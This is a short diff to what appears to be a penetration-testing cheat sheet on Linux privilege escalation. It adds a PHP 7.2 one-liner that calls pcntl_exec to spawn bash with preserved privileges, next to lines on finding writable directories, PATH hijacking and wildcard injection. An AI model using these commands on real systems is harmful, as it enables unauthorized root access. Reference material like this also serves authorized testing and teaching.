@@ -3423,6 +3423,12 @@ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 export PATH=$(pwd):$PATH
 ```
 
+##### PHP7.2
+
+```c
+/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
+```
+
 ##### Wildcards
 
 > https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
